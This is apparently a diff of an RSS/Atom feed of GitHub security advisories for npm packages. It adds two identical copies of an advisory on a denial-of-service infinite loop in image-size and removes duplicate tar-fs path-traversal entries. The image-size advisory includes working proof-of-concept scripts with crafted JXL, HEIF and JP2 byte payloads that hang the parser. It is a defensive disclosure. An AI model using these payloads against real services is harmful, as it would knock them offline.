@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-04-02T15:01:26.442Z</updated>
+    <updated>2025-04-02T16:01:32.538Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,534 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
+        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
+        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
+        <updated>2025-04-02T15:04:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
+<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
+<h3 id="details">Details</h3>
+<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
+export function detector(input: Uint8Array): imageType | undefined {
+  const byte = input[0]
+  if (byte in firstBytes) {
+    const type = firstBytes[byte]
+    if (type &amp;&amp; typeHandlers[type].validate(input)) {
+      return type
+    }
+  }
+
+  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
+  return keys.find(finder)
+}
+</code></pre>
+<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
+<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
+export const JXL: IImage = {
+  validate: (input: Uint8Array): boolean =&gt; {
+    const boxType = toUTF8String(input, 4, 8)
+    if (boxType !== 'JXL ') return false      //&lt;---
+
+    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
+    if (!ftypBox) return false
+
+    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
+    return brand === 'jxl '
+  },
+</code></pre>
+<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
+export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
+  input[offset] * 2 ** 24 +     // 0 +
+  input[offset + 1] * 2 ** 16 + // 0 +
+  input[offset + 2] * 2 ** 8 +  // 0 +
+  input[offset + 3]             // 0
+
+// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
+function readBox(input: Uint8Array, offset: number) {   // offset: 0
+  if (input.length - offset &lt; 4) return
+  const boxSize = readUInt32BE(input, offset)           // 0
+  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
+  return {
+    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
+    offset,                                             // 0
+    size: boxSize,                                      // 0
+  }
+}
+
+// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
+export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
+  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
+    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
+    if (!box) break                       // false
+    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
+    offset += box.size                    // offset += 0
+  }
+}
+</code></pre>
+<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
+<ul>
+<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
+<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Usage:</p>
+<pre><code class="language-bash">node main.js poc1|poc2
+</code></pre>
+<ul>
+<li>poc for <code>image-size@2.0.1</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 2.0.1
+// cd 2.0.1/
+// npm i image-size@2.0.1
+const {imageSizeFromFile} = require("image-size/fromFile");
+const {imageSize} = require("image-size");
+
+const fs = require('fs');
+
+// JXL
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x4A, 0x58, 0x4C, 0x20, // "JXL "
+]);
+
+// HEIF
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x66, 0x74, 0x79, 0x70, // "ftyp"
+//   0x61, 0x76, 0x69, 0x66  // "avif"
+// ]);
+
+// JP2
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x6A, 0x50, 0x20, 0x20, // "jP  "
+// ]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() { 
+  (async () =&gt; {
+    await imageSizeFromFile(FILENAME)
+    console.log('Done') // never executed
+  })();
+}
+
+function poc2() {
+  imageSize(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<ul>
+<li>poc for <code>image-size@1.2.0</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 1.2.0
+// cd 1.2.0/
+// npm i image-size@1.2.0
+const sizeOf = require("image-size");
+const fs = require('fs');
+
+// JXL
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x4A, 0x58, 0x4C, 0x20, // "JXL "
+]);
+
+// HEIF
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x66, 0x74, 0x79, 0x70, // "ftyp"
+//   0x61, 0x76, 0x69, 0x66  // "avif"
+// ]);
+
+// JP2
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x6A, 0x50, 0x20, 0x20, // "jP  "
+// ]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() {
+  sizeOf(FILENAME)
+  console.log('Done') // never executed
+}
+
+function poc2() {
+  sizeOf(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<ul>
+<li>poc for <code>image-size@1.1.1</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 1.1.1
+// cd 1.1.1/
+// npm i image-size@1.1.1
+const sizeOf = require("image-size");
+const fs = require('fs');
+
+// HEIF
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x66, 0x74, 0x79, 0x70, // "ftyp"
+  0x61, 0x76, 0x69, 0x66  // "avif"
+]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() {
+  sizeOf(FILENAME)
+  console.log('Done') // never executed
+}
+
+function poc2() {
+  sizeOf(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Denial of Service</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
+<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
+<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-04-02T15:04:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
+        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
+        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
+        <updated>2025-04-02T15:04:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
+<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
+<h3 id="details">Details</h3>
+<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
+export function detector(input: Uint8Array): imageType | undefined {
+  const byte = input[0]
+  if (byte in firstBytes) {
+    const type = firstBytes[byte]
+    if (type &amp;&amp; typeHandlers[type].validate(input)) {
+      return type
+    }
+  }
+
+  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
+  return keys.find(finder)
+}
+</code></pre>
+<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
+<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
+export const JXL: IImage = {
+  validate: (input: Uint8Array): boolean =&gt; {
+    const boxType = toUTF8String(input, 4, 8)
+    if (boxType !== 'JXL ') return false      //&lt;---
+
+    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
+    if (!ftypBox) return false
+
+    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
+    return brand === 'jxl '
+  },
+</code></pre>
+<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
+<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
+export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
+  input[offset] * 2 ** 24 +     // 0 +
+  input[offset + 1] * 2 ** 16 + // 0 +
+  input[offset + 2] * 2 ** 8 +  // 0 +
+  input[offset + 3]             // 0
+
+// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
+function readBox(input: Uint8Array, offset: number) {   // offset: 0
+  if (input.length - offset &lt; 4) return
+  const boxSize = readUInt32BE(input, offset)           // 0
+  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
+  return {
+    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
+    offset,                                             // 0
+    size: boxSize,                                      // 0
+  }
+}
+
+// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
+export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
+  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
+    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
+    if (!box) break                       // false
+    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
+    offset += box.size                    // offset += 0
+  }
+}
+</code></pre>
+<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
+<ul>
+<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
+<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Usage:</p>
+<pre><code class="language-bash">node main.js poc1|poc2
+</code></pre>
+<ul>
+<li>poc for <code>image-size@2.0.1</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 2.0.1
+// cd 2.0.1/
+// npm i image-size@2.0.1
+const {imageSizeFromFile} = require("image-size/fromFile");
+const {imageSize} = require("image-size");
+
+const fs = require('fs');
+
+// JXL
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x4A, 0x58, 0x4C, 0x20, // "JXL "
+]);
+
+// HEIF
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x66, 0x74, 0x79, 0x70, // "ftyp"
+//   0x61, 0x76, 0x69, 0x66  // "avif"
+// ]);
+
+// JP2
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x6A, 0x50, 0x20, 0x20, // "jP  "
+// ]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() { 
+  (async () =&gt; {
+    await imageSizeFromFile(FILENAME)
+    console.log('Done') // never executed
+  })();
+}
+
+function poc2() {
+  imageSize(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<ul>
+<li>poc for <code>image-size@1.2.0</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 1.2.0
+// cd 1.2.0/
+// npm i image-size@1.2.0
+const sizeOf = require("image-size");
+const fs = require('fs');
+
+// JXL
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x4A, 0x58, 0x4C, 0x20, // "JXL "
+]);
+
+// HEIF
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x66, 0x74, 0x79, 0x70, // "ftyp"
+//   0x61, 0x76, 0x69, 0x66  // "avif"
+// ]);
+
+// JP2
+// const PAYLOAD = new Uint8Array([
+//   0x00, 0x00, 0x00, 0x00, // Box with size 0
+//   0x6A, 0x50, 0x20, 0x20, // "jP  "
+// ]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() {
+  sizeOf(FILENAME)
+  console.log('Done') // never executed
+}
+
+function poc2() {
+  sizeOf(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<ul>
+<li>poc for <code>image-size@1.1.1</code></li>
+</ul>
+<pre><code class="language-js">// mkdir 1.1.1
+// cd 1.1.1/
+// npm i image-size@1.1.1
+const sizeOf = require("image-size");
+const fs = require('fs');
+
+// HEIF
+const PAYLOAD = new Uint8Array([
+  0x00, 0x00, 0x00, 0x00, // Box with size 0
+  0x66, 0x74, 0x79, 0x70, // "ftyp"
+  0x61, 0x76, 0x69, 0x66  // "avif"
+]);
+
+const FILENAME = "./poc.svg"
+
+function createPayload() {
+  fs.writeFileSync(FILENAME, PAYLOAD);
+}
+
+function poc1() {
+  sizeOf(FILENAME)
+  console.log('Done') // never executed
+}
+
+function poc2() {
+  sizeOf(PAYLOAD)
+  console.log('Done') // never executed
+}
+
+const pocs = new Map();
+pocs.set('poc1', poc1); // node main.js poc1
+pocs.set('poc2', poc2); // node main.js poc2
+
+async function run() {
+  createPayload()
+  const args = process.argv.slice(2);
+  const t = args[0];
+  const poc = pocs.get(t) || poc1;
+  console.log(`Running poc....`)
+  await poc();
+}
+
+run();
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Denial of Service</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
+<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
+<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-04-02T15:04:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mathlive] Duplicate Advisory: MathLive's Lack of Escaping of HTML allows for XSS]]></title>
         <id>https://github.com/advisories/GHSA-929m-phjg-qwcc</id>
@@ -773,50 +1301,6 @@ If Uptime Kuma is deployed in a production environment, the vulnerability could 
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-03-28T21:30:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
-        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
-        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
-        <updated>2025-03-28T22:11:43.000Z</updated>
-        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
-<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
-<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
-<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-27T18:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
-        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
-        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
-        <updated>2025-03-28T22:11:43.000Z</updated>
-        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
-<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
-<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
-<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-27T18:31:28.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
